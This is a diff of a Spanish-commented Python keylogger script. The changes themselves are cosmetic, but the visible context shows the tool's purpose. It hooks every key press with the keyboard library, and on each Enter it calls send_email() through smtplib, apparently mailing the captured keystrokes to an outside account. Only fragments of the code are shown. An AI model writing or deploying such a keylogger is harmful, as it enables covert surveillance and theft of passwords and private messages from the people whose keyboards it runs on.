@@ -1,5 +1,4 @@
 #importar librerias necesarias para desarrollar el keylogger 
-
 import smtplib
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -61,9 +60,7 @@ def pressedKey(key):
         # Envía el correo electrónico cuando se presiona la tecla "enter"
         send_email()
 
-# Inicia el keylogger
+# Iniciar el keylogger
 print("Keylogger iniciado. Presiona 'esc' para salir.")
 keyboard.on_press(pressedKey)
 keyboard.wait('esc')  
-# Espera hasta que se presione la tecla "esc" para salir
-
